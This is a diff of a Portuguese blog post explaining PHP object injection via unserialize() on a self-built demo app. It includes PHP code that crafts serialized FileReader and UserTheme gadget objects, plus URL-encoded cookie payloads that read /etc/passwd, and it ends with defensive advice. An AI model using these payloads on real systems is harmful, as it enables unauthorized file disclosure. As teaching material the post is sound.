@@ -1,7 +1,12 @@
 ---
 title: Serialization e Object injection vulnerability - Uma década de exploração
 date: 2020-08-01 01:02:17
-tags: security php object-injection owasp phpggc
+tags: 
+- security 
+- php 
+- object injection 
+- owasp phpggc
+- phpggc
 ---
 
 TL;DR
@@ -10,23 +15,23 @@ TL;DR
 
 ### Agenda
 
-- [Serialization?](#)
-	- [Serializando](#)
-	- [Onde mora o perigo?](#)
-- [O que é PHP Object Injection](#)
-- [Exploração](#)
-	- [Preparação](#)
-	- [Condições necessárias](#)
-	- [Ataque direto](#)
-	- [Gadget chains/POP - Property Oriented Programming](#)
-- [Onde estamos errando?](#)
-- [Créditos e referência](#)
+- Serialization?
+	- Serializando
+	- Onde mora o perigo?
+- O que é PHP Object Injection
+- Exploração
+	- Preparação
+	- Condições necessárias
+	- Ataque direto
+	- Gadget chains/POP - Property Oriented Programming
+- Onde estamos errando?
+- Créditos e referência
 
 ## Serialization?
 
 A prática/funcionalidade de serialização de dados utilizada em linguagens de programação (Java, php, python, etc) permite que um objeto seja representado em um valor que possa ser armazenado/transferido via rede (Texto). Já o ato de deserializar é oposto disso, trazemos essa representação em texto para a forma do dado original (array, objeto, etc). É possível ver a utiliazação em vários pontos de aplicações: Armazenamento/manipulação de cookies de usuários, adicionar vida longa ao estado de sessões, estratégias de caching entre outras coisas
 
-<div style="text-align:center"><img src="architecture-768432_640.jpg" /></div>
+<div style="text-align:center"><img src="/images/architecture-768432_640.jpg" /></div>
 
 ### Serializando
 
@@ -230,7 +235,7 @@ class User extends Controller {
 
 Criei um arquivo php simples que irá trabalhar com esse dado posteriormente:
 
-<div style="text-align:center"><img src="index1.png" /></div>
+<div style="text-align:center"><img src="/images/index1.png" /></div>
 
 Basicamente um form onde os dados são enviados para o backend.
 
@@ -276,14 +281,14 @@ session_start();
         </div>
 ```
 
-Aqui nosso cookie `extra_themes` é deserializado de forma nuca e crua:
+Aqui nosso cookie `extra_themes` é deserializado de forma nua e crua:
 
 ```php
 <?= isset($_COOKIE['extra_themes']) ? '<p>Extra themes: ' . unserialize($_COOKIE['extra_themes']) . '</p>' : '' ?>
 ```
 
-
- Então procuramos no sistema algumas classes que fazem sentido e achamos a seguinte classe:
+Com essa informação em mãos, que nosso dado é serializado e passa por `unserialize`, agora basta achar um vetor de entrada.
+Então procuramos no sistema algumas classes que fazem sentido, que podem ser utilizadas como vetor e achamos a seguinte classe:
 
 ```php
 class FileReader {
@@ -312,20 +317,22 @@ $obj->filename = '/etc/passwd';
 echo serialize($obj);
 ```
 
-O que resulta na seguinte string:
+Aqui ainda fazemos o require do autoload, o que na verdade nem é necessário! Não precisamos desse arquivo funcional, apenas precisamos que a classe existe no sistema alvo.
+
+o payload acima resulta na seguinte string:
 
 
 ```
 O:14:"App\FileReader":2:{s:11:"*fileName";N;s:8:"filename";s:11:"/etc/passwd";}
 ```
 
-Existe um ponto onde na representação dessa string teriamos nullbytes, então um payload ainda mais funcional para ser enviado em uma requisição seria:
+Existe um ponto onde na representação dessa string teriamos nullbytes (Assunto para outro post), então um payload ainda mais funcional para ser enviado em uma requisição seria:
 
 ```php
 <?php
 
 $obj = new App\FileReader();
-$obj->filename = '../passwd';
+$obj->filename = '/etc/passwd';
 $serialized = serialize($obj);
 
 $keys = str_split("%\x00\n\r\t+;");
@@ -337,7 +344,7 @@ echo $serialized;
 Dessa forma previnimos que nossa string entre quebrada na requisição:
 
 ```
-O:14:"App\FileReader":2:{s:11:"%00*%00fileName"%3BN%3Bs:8:"filename"%3Bs:9:"../passwd"%3B}
+O:14:"App\FileReader":2:{s:11:"%00*%00fileName"%3BN%3Bs:8:"filename"%3Bs:11:"/etc/passwd"%3B}
 ```
 
 Ok! Payload preparado.
@@ -350,23 +357,23 @@ Voltando a nossa aplicação, vamos lembrar que ela:
 
 Em um cenário de não ataque temos o seguinte conteudo nos cookies:
 
-<div style="text-align:center"><img src="cookie1.png" /></div>
+<div style="text-align:center"><img src="/images/cookie1.png" /></div>
 
 Agora como atacantes enviaremos o payload com conteúdo arbitrário:
 
-<div style="text-align:center"><img src="cookie2.png" /></div>
+<div style="text-align:center"><img src="/images/cookie2.png" /></div>
 
 Atualizamos a página e....
 
-<div style="text-align:center"><img src="index2.png" /></div>
+<div style="text-align:center"><img src="/images/index2.png" /></div>
 
-Booom! **Pwned**. Conseguimos escalar um ataque de [local-file-inclusion](LFD) injetando um objeto nos cookies que como é deserializado e "printado" na página, faz com que o método `__toString` seja executado, com a propriedade alterada e com um valor arbitrário -> `/etc/passwd`. Nesse caso utilizamos como vetor uma classe vetor que utiliza `__toString` mas poderiamos usar classes do sistema/vendor que utilizam `__destruct` ou  `__wakeup` facilmente. O grande trabalho é apenas encontrar classes que nos deem esse tipo de entrada.
+Booom! **Pwned**. Conseguimos escalar um ataque de [LFD][local-file-inclusion] injetando um objeto nos cookies que como é deserializado e "printado" na página, faz com que o método `__toString` seja executado, com a propriedade alterada e com um valor arbitrário -> `/etc/passwd`. Nesse caso utilizamos como vetor uma classe vetor que utiliza `__toString` mas poderiamos usar classes do sistema/vendor que utilizam `__destruct` ou  `__wakeup` facilmente. O grande trabalho é apenas encontrar classes que nos deem esse tipo de entrada.
 
 ### Gadget chains/POP - Property Oriented Programming
 
 Uma outra técnica que é utilizada em muitos ataques que ainda ocorrem hoje em dia mesmo após a primeira citação/paper (_Utilizing Code Reuse/ROP in PHP Application Exploits_) dez anos atrás e que é muito poderosa e traz consigo algum trabalho de pesquisa. Basicamente é o cenário mostrado anteriormente com steroids!
 
-<div style="text-align:center"><img src="paper_pop.png" /></div>
+<div style="text-align:center"><img src="/images/paper_pop.png" /></div>
 
 que é muito parecida com o cenário anterior mas que tem uma particularidade.
 Através da técnica de Property Oriented Programming fazemos o reuso de classes para que através de propriedades de classes seja possível um ataque como o anterior, nós literalmente pulamos de classe em classe e formamos um caminho válido até o pote de ouro :).
@@ -425,10 +432,11 @@ echo $serialized;
 Que resulta em:
 
 ```
-O:13:"App\UserTheme":1:{s:11:"extraThemes";O:14:"App\FileReader":1:{s:8:"fileName";s:11:"/etc/passwd";}}
+O:13:"App\UserTheme":1:{s:11:"extraThemes"%3BO:14:"App\FileReader":1:{s:8:"fileN
+ame"%3Bs:11:"/etc/passwd"%3B}}
 ```
 
-Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`:
+Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`, alcançando a injeção de objeto via via um gadget.
 
 ```php
 class FileReader {
@@ -447,16 +455,16 @@ class FileReader {
 
 A utilização da propridade `$this->extraThemes` com um valor arbitrário dentro da classe `UserThemes` nos permite "triggar" a vulnerabilidade
 
-<div style="text-align:center"><img src="mindblow.gif" /></div>
+<div style="text-align:center"><img src="/images/mindblow.gif" /></div>
 
 Então essa vulnerabilidade não se limita apenas ao contexto da aplicação, pelo contrário... é possível abusar de bibliotecas instaladas para que outros tipos de ataques sejam alcançados.
-E pensando nisso foi criado a ferramenta ([phpggc][phpggc] que é especializada nesse tipo de payload utilizando pop, que possui diversas bibliotecas/frameworks de mercado mapeadas. É possível obter diversos payloads com estratégias diversas de encoding/bypass via linha de comando (no qual já contribui :))
+E pensando nisso foi criado a ferramenta ([phpggc][phpggc] que é especializada nesse tipo de payload utilizando as mais diversas técnicas com gadget chains, que possui diversas bibliotecas/frameworks de mercado mapeadas. É possível obter diversos payloads com estratégias diversas de encoding/bypass via linha de comando (no qual já contribui :))
 A ferramenta hoje possui uma vasta quantidade de bibliotecas já mapeadas:
 
-<div style="text-align:center"><img src="phpggc.png" /></div>
+<div style="text-align:center"><img src="/images/phpggc.png" /></div>
 
 ## Onde estamos errando?
-<div style="text-align:center"><img src="message-unserialize.png" /></div>
+<div style="text-align:center"><img src="/images/message-unserialize.png" /></div>
 
 Essa mensagem quando entramos na documentação da função unserialize nos deixa bem claro que **NUNCA** devemos confiar no input do usuário. Caso seja possível, sempre utilize `json_encode` e funções relacionadas para trabalhar com estado de dados.
 
